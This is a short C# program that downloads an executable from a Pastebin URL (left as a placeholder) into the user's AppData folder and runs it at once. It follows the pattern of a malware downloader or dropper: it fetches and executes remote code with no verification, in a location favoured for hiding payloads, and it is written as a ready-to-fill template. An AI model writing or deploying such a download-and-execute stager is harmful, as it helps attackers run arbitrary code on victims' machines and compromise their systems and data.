using System;
using System.IO;
using System.Net;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {
        string pastebinUrl = "PASTEBIN_FILE_URL"; // Replace with your Pastebin file URL
        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string fileName = "downloaded_file.exe"; // Replace with your desired file name
        string filePath = Path.Combine(appDataPath, fileName);

        try
        {
            using (WebClient client = new WebClient())
            {
                Console.WriteLine("Downloading file...");
                client.DownloadFile(pastebinUrl, filePath);
                Console.WriteLine("Download complete.");
            }

            // Execute the file
            Console.WriteLine("Executing file...");
            Process.Start(filePath);
            Console.WriteLine("File executed.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }
}